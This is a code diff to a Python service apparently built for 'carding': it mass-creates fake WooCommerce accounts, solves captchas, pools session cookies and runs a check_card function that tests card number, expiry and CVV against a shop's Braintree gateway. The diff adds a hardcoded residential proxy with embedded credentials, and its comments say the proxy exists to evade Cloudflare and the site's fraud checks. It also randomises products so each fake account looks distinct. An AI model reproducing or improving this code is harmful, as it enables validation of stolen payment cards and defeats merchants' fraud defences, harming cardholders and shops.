@@ -15,6 +15,7 @@ app = FastAPI()
 GATEWAY_NAME = "Braintree Auth"
 CREDIT = "@xoxhunterxd"
 BASE_URL = (os.environ.get("BASE_URL") or os.environ.get("URL") or "").rstrip("/")
+PROXY_URL = os.environ.get("PROXY", "http://X8KFDBKQ:urE9yrFz@proxy.pinguproxy.com:12933")
 COOKIE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cookies_pool.json")
 STATS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cookies_stats.json")
 
@@ -201,9 +202,18 @@ def remove_cookie_entry(email):
         except Exception:
             pass
 
+def site_session():
+    """Every request that touches the site goes out through the residential
+    proxy — CF and the site's fraud checks hate datacenter IPs. Solver and
+    Braintree API calls stay direct."""
+    s = plain_requests.Session()
+    if PROXY_URL:
+        s.proxies = {"http": PROXY_URL, "https": PROXY_URL}
+    return s
+
 def check_cookie_alive(cookies_dict):
     try:
-        s = plain_requests.Session()
+        s = site_session()
         s.headers.update({'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
         for k, v in cookies_dict.items():
             s.cookies.set(k, v)
@@ -342,6 +352,60 @@ def solve_turnstile(page_url=None, sitekey="0x4AAAAAAA9ogJWz4UGndXNX", max_retry
             pass
     return None
 
+# ─── Product Pool (multi-source, random pick per account) ────
+_product_ids = []
+_product_lock = threading.Lock()
+
+def get_product_ids():
+    """Collect product IDs so every account rides a DIFFERENT random product.
+    Source #1: the public WooCommerce Store API (works even when the shop
+    page renders via blocks with no classic markers). Fallback: classic
+    HTML patterns on paginated/sorted shop pages."""
+    global _product_ids
+    with _product_lock:
+        if _product_ids:
+            return _product_ids
+    ids = set()
+    s = site_session()
+    s.headers.update({
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'accept-language': 'en-US,en;q=0.9',
+    })
+    # 1) Store API — clean JSON, block-rendered shops included
+    try:
+        r = s.get(f"{BASE_URL}/wp-json/wc/store/v1/products?per_page=100",
+                  timeout=25, headers={"Accept": "application/json"})
+        if r.status_code == 200:
+            for p in r.json():
+                pid = p.get("id")
+                if pid and p.get("is_purchasable", True):
+                    ids.add(str(pid))
+    except Exception:
+        pass
+    # 2) classic HTML fallback
+    if not ids:
+        urls = [
+            f"{BASE_URL}/shop/",
+            f"{BASE_URL}/shop/page/2/",
+            f"{BASE_URL}/shop/?orderby=date",
+            f"{BASE_URL}/",
+        ]
+        for u in urls:
+            try:
+                r = s.get(u, timeout=20)
+                if r.status_code == 200:
+                    ids.update(re.findall(r'data-product_id="(\d+)"', r.text))
+                    ids.update(re.findall(r'add-to-cart=(\d+)', r.text))
+            except Exception:
+                continue
+            if ids:
+                break
+    with _product_lock:
+        if ids:
+            _product_ids = list(ids)
+        return _product_ids
+
 # ─── Account Creator ─────────────────────────────────────────
 
 def create_account(proxy=None):
@@ -355,7 +419,7 @@ def create_account(proxy=None):
     import json
     if not BASE_URL:
         return {"email": "", "status": "failed", "reason": "config_missing_base_url"}
-    s = plain_requests.Session()
+    s = site_session()
     s.headers.update({
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
@@ -366,14 +430,10 @@ def create_account(proxy=None):
     email = f"{first.lower()}{last.lower()}{random.randint(1975, 2005)}@gmail.com"
     pwd = f"{first.capitalize()}@{random.randint(1000, 9999)}!"
     try:
-        # 1. Shop page -> find a product
+        # 1. Random product from the multi-source pool
         if _stop_creating_event.is_set():
             return {"email": email, "status": "failed", "reason": "stopped"}
-        r = s.get(f"{BASE_URL}/shop/", timeout=20)
-        if r.status_code != 200:
-            return {"email": email, "status": "failed", "reason": "shop_page_failed"}
-        pids = re.findall(r'data-product_id="(\d+)"', r.text)
-        if not pids: pids = re.findall(r'add-to-cart=(\d+)', r.text)
+        pids = get_product_ids()
         if not pids:
             return {"email": email, "status": "failed", "reason": "no_product_found"}
         pid = random.choice(pids)
@@ -661,7 +721,7 @@ def add_billing_bg(entry):
     check picks up this cookie, billing is almost always already done."""
     if entry.get("billing"):
         return  # already done
-    s = plain_requests.Session()
+    s = site_session()
     s.headers.update({
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
@@ -696,7 +756,7 @@ def check_card(cc, mm, yy, cvv, proxy=None):
     if not BASE_URL:
         return result("Config error: BASE_URL env not set")
 
-    s = plain_requests.Session()
+    s = site_session()
     s.headers.update({
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
         'accept-language': 'en-US,en;q=0.9',
